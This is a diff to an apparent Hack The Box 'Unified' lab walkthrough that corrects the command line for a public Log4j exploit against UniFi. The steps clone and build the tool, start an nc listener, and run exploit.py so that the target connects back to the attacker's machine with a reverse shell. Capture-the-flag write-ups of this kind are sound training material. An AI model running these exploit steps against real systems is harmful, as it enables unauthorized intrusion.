@@ -134,7 +134,7 @@ git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi \ && 
 mvn package -f utils/rogue-jndi/
 </pre>
 Open another window to execute the <code>nc</code> command, and then use the python script to attack the vulnerability.<br>
-<b>cmd</b>：<code>python exploit.py -u &lt;target_ip&gt; -i &lt;local_ip&gt; &lt;nc_port&gt;</code>
+<b>cmd</b>：<code>python exploit.py -u &lt;target_ip&gt; -i &lt;local_ip&gt; -p &lt;nc_port&gt;</code>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/exploit.py.png" alt="exploit" width="60%">
 After the attack is successful, you will see the similar picture below.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/nc1.png" alt="nc1" width="60%">
